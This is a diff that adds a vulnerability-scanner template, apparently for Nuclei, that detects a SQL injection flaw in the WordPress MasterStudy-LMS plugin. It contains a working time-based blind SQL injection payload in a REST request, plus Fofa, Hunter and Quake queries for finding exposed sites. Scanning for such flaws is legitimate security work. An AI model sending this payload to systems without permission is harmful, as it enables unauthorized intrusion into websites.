@@ -1,0 +1,32 @@
+id: WordPress_MasterStudy-LMS_SQLi
+
+info:
+  name: WordPress_MasterStudy-LMS_SQLi
+  author: HK
+  severity: high
+  description: WordPress MasterStudy-LMS插件存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="wp-content/plugins/masterstudy-lms-learning-management-system/"
+    Hunter-query: body="wp-content/plugins/masterstudy-lms-learning-management-system/"
+    Quake-query: body="wp-content/plugins/masterstudy-lms-learning-management-system/"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%282%29%29%29sauT%29+AND+%283071%3D3071 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
+    Accept-Charset: utf-8
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
